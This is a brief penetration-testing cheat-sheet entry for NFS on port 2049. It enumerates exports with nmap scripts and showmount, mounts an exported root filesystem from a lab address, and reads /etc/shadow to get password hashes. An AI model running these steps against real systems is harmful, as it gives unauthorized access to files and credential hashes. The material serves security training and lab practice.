
## Port 2049 | nfs

https://www.youtube.com/watch?v=RZM4qf2HM9A

Network File System (NFS)

Use Nmap script to identify NFS
```
# nmap --script=nfs-ls 192.168.50.7
# nmap --script=nfs-showmount 192.168.50.7
```
Use `showmount` command to determine if the "/" share (the root of the file system) is being exported. May need to install nfs-common package to use "showmount" command
```
# apt-get install nfs-common
# showmount -e 192.168.50.7
```
The root directory is shared. Let’s mount it
```
# mkdir nfs_root
# mount -t nfs 192.168.50.7:/ ~/nfs_root -o nolock
```
Try to read shadow file
```
# cat ~/nfs_root/etc/shadow
```
